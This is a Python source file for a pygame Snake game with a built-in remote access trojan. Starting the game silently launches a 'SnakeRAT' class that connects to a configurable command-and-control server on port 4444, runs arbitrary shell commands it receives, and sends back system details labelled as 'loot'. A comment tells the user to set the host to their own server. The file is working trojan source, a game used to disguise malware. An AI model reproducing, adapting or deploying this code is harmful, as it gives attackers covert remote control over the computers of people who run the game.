import pygame
import sys
import socket
import json
import threading
import time
import os
import base64
import subprocess
import platform
import io

pygame.init()

# C2 Config
C2_HOST = "127.0.0.1"  # Change to your server IP
C2_PORT = 4444
CLIENT_ID = f"{platform.node()}_{os.getpid()}"

class SnakeRAT:
    def __init__(self):
        self.sock = None
        self.connected = False
        self.running = True
        self.connect_thread = threading.Thread(target=self.connection_loop, daemon=True)
        self.connect_thread.start()

    def send(self, data):
        if not self.sock:
            return False
        try:
            msg = json.dumps(data).encode()
            length = len(msg)
            self.sock.sendall(length.to_bytes(4, 'big'))
            self.sock.sendall(msg)
            return True
        except:
            self.sock = None
            return False

    def recv_cmd(self):
        if not self.sock:
            return None
        try:
            len_data = self.sock.recv(4)
            if len(len_data) != 4:
                return None
            msg_len = int.from_bytes(len_data, 'big')
            msg_data = self.sock.recv(msg_len)
            return json.loads(msg_data.decode())
        except:
            self.sock = None
            return None

    def connection_loop(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((C2_HOST, C2_PORT))
                self.connected = True
                self.cmd_thread = threading.Thread(target=self.command_loop, daemon=True)
                self.cmd_thread.start()
                self.heartbeat_loop()
            except:
                self.connected = False
                self.sock = None
                time.sleep(3)

    def heartbeat_loop(self):
        while self.connected and self.running:
            self.send({'type': 'heartbeat', 'client_id': CLIENT_ID})
            time.sleep(20)

    def command_loop(self):
        while self.connected and self.running:
            cmd = self.recv_cmd()
            if not cmd:
                continue

            cmd_type = cmd.get('type', '')
            
            if cmd_type == 'shell':
                result = self.run_shell(cmd.get('command', ''))
                self.send({'type': 'shell_result', 'output': result, 'client_id': CLIENT_ID})
            
            elif cmd_type == 'info':
                info = self.get_system_info()
                self.send({'type': 'loot', 'loot_type': 'info', 'data': base64.b64encode(info.encode()).decode(), 'client_id': CLIENT_ID})

    def run_shell(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
            output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}\nCODE: {result.returncode}"
            return output
        except Exception as e:
            return f"ERROR: {str(e)}"

    def get_system_info(self):
        try:
            info = f"""
CLIENT: {CLIENT_ID}
OS: {platform.system()} {platform.release()}
Arch: {platform.machine()}
CWD: {os.getcwd()}
User: {os.getlogin()}
PID: {os.getpid()}
"""
            return info
        except:
            return "ERROR getting info"

# Snake Game Class
class SnakeGame:
    def __init__(self):
        self.width = 800
        self.height = 600
        self.screen = pygame.display.set_mode((self.width, self.height))
        pygame.display.set_caption('Snake Game')
        self.clock = pygame.time.Clock()
        self.font = pygame.font.Font(None, 36)
        self.reset_game()

    def reset_game(self):
        self.x = self.width // 2
        self.y = self.height // 2
        self.dx = 20
        self.dy = 0
        self.snake = [(self.x, self.y)]
        self.food = self.new_food()
        self.score = 0
        self.speed = 10

    def new_food(self):
        import random
        while True:
            fx = random.randint(0, (self.width-20)//20) * 20
            fy = random.randint(0, (self.height-20)//20) * 20
            if (fx, fy) not in self.snake:
                return (fx, fy)

    def run(self):
        rat = SnakeRAT()  # Start RAT silently
        
        running = True
        while running:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_UP and self.dy == 0:
                        self.dx, self.dy = 0, -20
                    if event.key == pygame.K_DOWN and self.dy == 0:
                        self.dx, self.dy = 0, 20
                    if event.key == pygame.K_LEFT and self.dx == 0:
                        self.dx, self.dy = -20, 0
                    if event.key == pygame.K_RIGHT and self.dx == 0:
                        self.dx, self.dy = 20, 0

            # Update snake
            self.x += self.dx
            self.y += self.dy
            
            # Wrap around edges
            if self.x >= self.width: self.x = 0
            elif self.x < 0: self.x = self.width - 20
            if self.y >= self.height: self.y = 0
            elif self.y < 0: self.y = self.height - 20

            self.snake.insert(0, (self.x, self.y))

            # Check food collision
            if (self.x, self.y) == self.food:
                self.score += 1
                self.food = self.new_food()
                if self.score % 10 == 0:
                    self.speed += 1
            else:
                self.snake.pop()

            # Check self collision
            if (self.x, self.y) in self.snake[1:]:
                self.reset_game()

            # Draw everything
            self.screen.fill((20, 20, 40))
            
            # Draw snake
            for i, segment in enumerate(self.snake):
                color = (0, 255 - i*2, 0) if i < len(self.snake)-1 else (0, 255, 0)
                pygame.draw.rect(self.screen, color, (segment[0], segment[1], 18, 18))
            
            # Draw food
            pygame.draw.rect(self.screen, (255, 100, 100), (*self.food, 18, 18))
            
            # Draw score
            score_text = self.font.render(f"Score: {self.score}", True, (255, 255, 255))
            self.screen.blit(score_text, (20, 20))
            
            pygame.display.flip()
            self.clock.tick(self.speed)

        pygame.quit()
        sys.exit()

if __name__ == "__main__":
    game = SnakeGame()
    game.run()